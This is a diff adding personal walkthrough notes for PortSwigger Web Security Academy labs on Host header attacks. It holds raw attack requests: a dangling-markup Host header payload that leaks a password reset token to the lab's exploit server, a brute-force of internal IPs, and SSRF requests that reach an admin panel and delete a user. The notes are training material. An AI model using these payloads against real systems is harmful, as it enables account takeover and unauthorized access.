@@ -82,11 +82,20 @@ username=carlos
 
 ## Lab - 3: Password reset poisoning via dangling markup (E)
 
-> plan after XSS
+- This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.
+
+- Host header is vulnerable at adding any arbitary port number and that port number is reflected back in view raw (at user email in box)
+
+```
+POST /forgot-password HTTP/1.1
+Host: 0ab200920371b631c106b24a007500c9.web-security-academy.net:'><a+href="//exploit-0a8300e5032db65cc101b150010b00eb.exploit-server.net/exploit?token=
+...
+username=carlos
+```
 
 ---
 
-## Lab - 4: Web cache poisoning via ambiguous requests
+## Lab - 4: Web cache poisoning via ambiguous requests (P)
 
 - This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page. To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.
 
@@ -112,3 +121,71 @@ Host: localhost
 ## Lab - 6: Routing-based SSRF (P)
 
 - This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.
+
+- Test the Host header and found that it requests to `burp collaborator`
+- in burp intruder
+
+```
+GET / HTTP/1.1
+Host: 192.168.0.§0§
+...
+```
+
+- brute force 0 - 255
+
+```
+Uncheck the update Host Header to match target (important)
+```
+
+- found one IP that will get 302 request to admin
+- follow the redirect and found post request to delete the username with CSRF token
+
+```
+GET /admin/delete?csrf=rand-string&username=carlos HTTP/1.1
+```
+
+- will get invalid CSRF token and took the session cookie from header
+- set the cookie and
+
+```
+GET /admin HTTP/1.1
+```
+
+- get the CSRF token
+- with the same cookie and CSRF token and post request to delete carlos
+
+---
+
+## Lab - 7: SSRF via flawed request parsing (P)
+
+- This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.
+
+- same as lab 6 except Host header injection using absolute URL
+
+```
+GET https://lab-id.web-security-academy.net
+Host: 192.168.0.1
+...
+```
+
+---
+
+## Lab - 8: Host validation bypass via connection state attack (P)
+
+- This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives. To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin, then delete the user carlos.
+
+- send request to repeater twice and group them
+- then change to send group (single connection)
+- for one of the request, change
+
+```
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+...
+Connection: keep-alive
+```
+
+- and send the request together and found the admin panel
+- other steps same as above
+
+---
